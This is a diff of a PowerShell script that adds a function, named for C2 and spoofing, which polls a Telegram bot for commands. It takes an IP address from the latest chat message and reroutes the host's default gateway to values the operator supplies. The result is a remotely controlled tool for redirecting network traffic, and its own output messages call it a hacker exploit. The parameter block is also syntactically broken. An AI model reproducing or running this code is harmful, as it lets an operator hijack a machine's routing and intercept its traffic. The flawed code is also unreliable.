@@ -12,14 +12,45 @@
 
 Log-Message " [*] START JOB ------------------- ELMO9AWIM "
 
-  
+Function C2-AUTO-GETAY-SPOOF{
+  Param(
+  [Parameter(Mandatory=$true,Position=0)] [String[]]$BId
+  [Parameter(Mandatory=$true,Position=1)] [String[]]$BToken
+  [Parameter(Mandatory=$true,Position=2)] [String[]]$FOLD
+  [Parameter(Mandatory=$true,Position=3)] [String[]]$FNEW
+  [Parameter(Mandatory=$true,Position=4)] [String[]]$FLOG
+
+ 
+  )
+  Write-Output "BOT ID: $BId || BOT TOKEN: $BToken"
+
+
+  $MyToken = $BToken
+  $ChatID = $BId
+  $MyBotUpdates = Invoke-WebRequest -Uri "https://api.telegram.org/bot$($MyToken)/getUpdates"
+  #Convert the result from json and put them in an array
+  $jsonresult = [array]($MyBotUpdates | ConvertFrom-Json).result
+
+  $LastMessage = ""
+  Foreach ($Result in $jsonresult)  {
+    If ($Result.message.chat.id -eq $ChatID)  {
+      $LastMessage = $Result.message.text
+    }
+  }
+
+  Log-Message " [*] START DOWNLOADING ------------------- ELMO9AWIM "
+
+  Write-Host "RUN ME $LastMessage"
+
+  $TELEIP = $LastMessage
+
   #variables
-  $ipaddress='1.2.3.4'
+  $ipaddress= $TELEIP
   $index = get-netipaddress | where-object {$_.IPAddress -eq $ipaddress} | select -ExpandProperty InterfaceIndex
-  $Log = 'c:\windows\options\gateway\gatewaychange.log'
+  $Log = $FLOG
   $gateway = get-netroute -DestinationPrefix '0.0.0.0/0' | select -ExpandProperty NextHop
-  $oldroute = '1.1.1.1'
-  $newroute = '2.2.2.2'
+  $oldroute = $FOLD
+  $newroute = $FNEW
   $destination = '0.0.0.0/0'
 
   #Start Changing the Gateway if needed
@@ -41,3 +72,16 @@ Log-Message " [*] START JOB ------------------- ELMO9AWIM "
     Write-Warning -Message "Gateway is already set to $newroute and needs no change"
   
   }
+
+  
+
+  Log-Message " [*] END JOB ------------------- ELMO9AWIM "
+  
+  Write-Host "SPOOF ME $TELEIP || $FOLD >>> $FNEW || LOG ON $FLOG HACKER ---------------- EXPLOIT ?.> "
+  
+  
+}
+
+  
+  
+
